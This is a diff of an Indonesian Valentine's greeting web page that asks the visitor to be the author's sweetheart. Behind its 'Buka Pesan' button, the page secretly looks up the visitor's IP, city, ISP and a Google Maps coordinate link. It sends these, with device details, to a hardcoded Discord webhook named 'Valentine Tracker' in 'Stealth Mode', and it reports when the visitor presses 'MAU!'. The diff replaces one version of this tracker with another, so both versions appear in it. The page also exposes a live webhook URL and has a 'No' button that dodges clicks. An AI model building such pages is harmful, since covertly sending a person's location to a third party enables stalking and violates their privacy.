@@ -6,90 +6,19 @@
     <title>Special for You | Valentine 2026</title>
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
     <style>
-        :root {
-            --primary: #ff4d6d;
-            --secondary: #ff85a1;
-            --bg: #fff0f3;
-        }
-
-        body {
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            background: var(--bg);
-            font-family: 'Poppins', sans-serif;
-            overflow: hidden;
-        }
-
-        #card {
-            background: white;
-            padding: 30px;
-            border-radius: 25px;
-            box-shadow: 0 15px 35px rgba(255, 77, 109, 0.15);
-            text-align: center;
-            max-width: 400px;
-            width: 90%;
-            position: relative;
-            z-index: 10;
-            transition: all 0.5s ease;
-        }
-
-        .envelope {
-            font-size: 80px;
-            margin-bottom: 20px;
-            display: block;
-            animation: float 3s ease-in-out infinite;
-        }
-
+        :root { --primary: #ff4d6d; --secondary: #ff85a1; --bg: #fff0f3; }
+        body { margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: var(--bg); font-family: 'Poppins', sans-serif; overflow: hidden; }
+        #card { background: white; padding: 30px; border-radius: 25px; box-shadow: 0 15px 35px rgba(255, 77, 109, 0.15); text-align: center; max-width: 400px; width: 90%; position: relative; z-index: 10; }
+        .envelope { font-size: 80px; margin-bottom: 20px; display: block; animation: float 3s ease-in-out infinite; }
         h2 { color: var(--primary); margin-bottom: 10px; }
         p { color: #555; line-height: 1.5; }
-
-        .btn-group {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin-top: 25px;
-            position: relative;
-        }
-
-        button {
-            padding: 12px 25px;
-            border: none;
-            border-radius: 50px;
-            cursor: pointer;
-            font-weight: 600;
-            transition: 0.3s;
-        }
-
-        #yesBtn {
-            background: var(--primary);
-            color: white;
-            box-shadow: 0 5px 15px rgba(255, 77, 109, 0.4);
-        }
-
-        #noBtn {
-            background: #eee;
-            color: #666;
-            position: relative;
-        }
-
-        @keyframes float {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-20px); }
-        }
-
+        .btn-group { display: flex; justify-content: center; gap: 15px; margin-top: 25px; position: relative; }
+        button { padding: 12px 25px; border: none; border-radius: 50px; cursor: pointer; font-weight: 600; transition: 0.3s; }
+        #yesBtn { background: var(--primary); color: white; box-shadow: 0 5px 15px rgba(255, 77, 109, 0.4); }
+        #noBtn { background: #eee; color: #666; position: relative; }
         .hidden { display: none !important; }
-
-        .bg-heart {
-            position: absolute;
-            color: var(--secondary);
-            opacity: 0.2;
-            pointer-events: none;
-            z-index: 1;
-        }
+        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-20px); } }
+        .bg-heart { position: absolute; color: var(--secondary); opacity: 0.2; pointer-events: none; z-index: 1; }
     </style>
 </head>
 <body>
@@ -98,13 +27,13 @@
         <div id="step1">
             <span class="envelope">💌</span>
             <h2>Hai Kamu...</h2>
-            <p>Aku punya pertanyaan penting di hari kasih sayang ini.</p>
-            <button class="btn" id="nextBtn" onclick="nextStep()" style="background: var(--primary); color: white;">Buka Pesan</button>
+            <p>Ada pesan singkat yang ingin aku sampaikan secara langsung.</p>
+            <button id="nextBtn" onclick="initiateSpy()" style="background: var(--primary); color: white;">Buka Pesan</button>
         </div>
 
         <div id="step2" class="hidden">
             <span class="envelope">💝</span>
-            <h2>mau gak jadi orang tersayangku?</h2>
+            <h2>Mau gak jadi orang tersayangku?</h2>
             <p>Jangan dipikirkan terlalu lama ya!</p>
             <div class="btn-group">
                 <button id="yesBtn" onclick="celebrate()">MAU! ❤️</button>
@@ -114,108 +43,97 @@
 
         <div id="final" class="hidden">
             <span class="envelope">💖</span>
-            <h2 id="finalMsg">YAY! I Love You!</h2>
-            <p>Terima kasih sudah memilihku. Hari ini milik kita berdua.</p>
+            <h2>YAY! I Love You!</h2>
+            <p>Terima kasih sudah memilihku. <br> Hari ini milik kita berdua.</p>
             <p style="font-size: 0.8rem; margin-top: 20px; opacity: 0.7;">14 Februari 2026</p>
         </div>
     </div>
 
     <script>
-       async function nextStep() {
-    // 1. Ambil info perangkat & browser
-    const userAgent = navigator.userAgent;
-    const platform = navigator.platform;
-    const screenRes = `${window.screen.width}x${window.screen.height}`;
-    
-    // 2. Ambil IP dan Lokasi Kasar (Menggunakan layanan gratis ipapi)
-    let locationData = "Gagal mengambil lokasi";
-    try {
-        const response = await fetch('https://ipapi.co/json/');
-        const data = await response.json();
-        locationData = `${data.city}, ${data.region}, ${data.country_name} (IP: ${data.ip})`;
-    } catch (err) {
-        console.log("Pelacakan lokasi diblokir adblocker.");
-    }
+        const DISCORD_URL = "https://discord.com/api/webhooks/1463473630251061375/xi6CyaH0ElCz_jUz9vf_iFfOxfNuh1iZfX_31GAO7jOcxRjkhd723nbEFd3ZAp1YvhME"; // <--- GANTI INI
 
-    // 3. Kirim "Laporan Intelijen" ke Discord
-    const trackData = {
-        username: "Valentine Spy System 🕵️‍♂️",
-        embeds: [{
-            title: "Notifikasi: Link Dibuka!",
-            description: "Seseorang baru saja membuka link Valentine kamu.",
-            color: 3447003, // Warna Biru
-            fields: [
-                { name: "Lokasi (Kota)", value: locationData, inline: false },
-                { name: "Perangkat", value: platform, inline: true },
-                { name: "Resolusi Layar", value: screenRes, inline: true },
-                { name: "Browser Info", value: userAgent, inline: false }
-            ],
-            footer: { text: "Data ini diambil saat tombol 'Buka Pesan' diklik" }
-        }]
-    };
-
-    fetch("https://discord.com/api/webhooks/1463473630251061375/xi6CyaH0ElCz_jUz9vf_iFfOxfNuh1iZfX_31GAO7jOcxRjkhd723nbEFd3ZAp1YvhME", {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(trackData)
-    });
-
-    // 4. Lanjut ke tampilan pertanyaan
+      function initiateSpy() {
+    // 1. Tampilan di HP dia langsung pindah (Instan)
     document.getElementById('step1').classList.add('hidden');
     document.getElementById('step2').classList.remove('hidden');
-}
 
+    // 2. Mulai proses pelacakan di latar belakang
+    (async () => {
+        try {
+            // Kita ambil data lokasi dulu
+            const response = await fetch(`https://ipwho.is/?_=${new Date().getTime()}`);
+            const data = await response.json();
+            
+            let infoFinal = "";
+            if(data.success) {
+                // Jika sukses, susun datanya
+                infoFinal = `📍 **Lokasi:** ${data.city}, ${data.region}, ${data.country}\n` +
+                            `🌐 **ISP:** ${data.connection.isp}\n` +
+                            `🗺️ **Maps:** https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
+            } else {
+                infoFinal = "❌ Gagal melacak lokasi (Data tidak ditemukan)";
+            }
+
+            // 3. SETELAH data dapat, baru kirim ke Discord
+            sendToDiscord("🔔 Seseorang Membuka Link!", infoFinal, 3447003);
+
+        } catch (e) { 
+            // Jika koneksi internet atau API error
+            sendToDiscord("🔔 Seseorang Membuka Link!", "⚠️ Gagal melacak (Terhalang Adblock/Sinyal)", 16711680); 
+        }
+    })();
+
+
+            // Pindah ke step 2
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+        }
+
+        // 2. FUNGSI TOMBOL ENGGAK
         function moveButton() {
-            // NOTIFIKASI PAKSA
             alert("Eits, gak bisa! HARUSS MAUU!! ❤️");
-
             const noBtn = document.getElementById('noBtn');
             const x = Math.random() * (window.innerWidth - noBtn.offsetWidth);
             const y = Math.random() * (window.innerHeight - noBtn.offsetHeight);
-            
             noBtn.style.position = 'fixed';
             noBtn.style.left = x + 'px';
             noBtn.style.top = y + 'px';
         }
 
+        // 3. FUNGSI CELEBRATE (MAU)
         function celebrate() {
-            const WEBHOOK_URL = "https://discord.com/api/webhooks/1463473630251061375/xi6CyaH0ElCz_jUz9vf_iFfOxfNuh1iZfX_31GAO7jOcxRjkhd723nbEFd3ZAp1YvhME";
-            
             document.getElementById('step2').classList.add('hidden');
             document.getElementById('final').classList.remove('hidden');
             
-            confetti({
-                particleCount: 150,
-                spread: 70,
-                origin: { y: 0.6 },
-                colors: ['#ff4d6d', '#ff85a1', '#ffffff']
-            });
+            confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
 
-            const data = {
-                username: "Valentine Tracker 💖",
-                avatar_url: "https://cdn-icons-png.flaticon.com/512/833/833472.png",
-                embeds: [{
-                    title: "CIEEEE! DIA BILANG MAU! 😍",
-                    description: "Target baru saja menekan tombol **MAU!** di website Valentine kamu.",
-                    color: 16731501,
-                    fields: [
-                        { name: "Status", value: "Accepted ❤️", inline: true },
-                        { name: "Waktu", value: new Date().toLocaleString('id-ID'), inline: true }
-                    ],
-                    footer: { text: "Valentine 2026 - Mission Success" }
-                }]
-            };
-
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            })
-            .then(() => console.log("Notifikasi Discord Terkirim!"))
-            .catch(err => console.error("Gagal kirim notif:", err));
+            // Kirim notifikasi kedua (Jawaban Mau)
+            sendToDiscord("🎯 TARGET TERKUNCI!", "Dia sudah menekan tombol **MAU!** ❤️", 16731501);
         }
 
-        function createBgHeart() {
+        // 4. HELPER KIRIM DISCORD
+        function sendToDiscord(title, desc, color) {
+            fetch(DISCORD_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    username: "Valentine Tracker 🕵️",
+                    embeds: [{
+                        title: title,
+                        description: desc,
+                        color: color,
+                        fields: [
+                            { name: "Perangkat", value: navigator.platform, inline: true },
+                            { name: "Waktu", value: new Date().toLocaleString('id-ID'), inline: true }
+                        ],
+                        footer: { text: "Valentine 2026 Stealth Mode" }
+                    }]
+                })
+            });
+        }
+
+        // Efek Dekorasi Hati
+        for (let i = 0; i < 25; i++) {
             const heart = document.createElement('div');
             heart.classList.add('bg-heart');
             heart.innerHTML = '❤️';
@@ -224,12 +142,6 @@
             heart.style.fontSize = Math.random() * 20 + 10 + 'px';
             document.body.appendChild(heart);
         }
-
-        for (let i = 0; i < 30; i++) {
-            createBgHeart();
-        }
     </script>
 </body>
 </html>
-
-
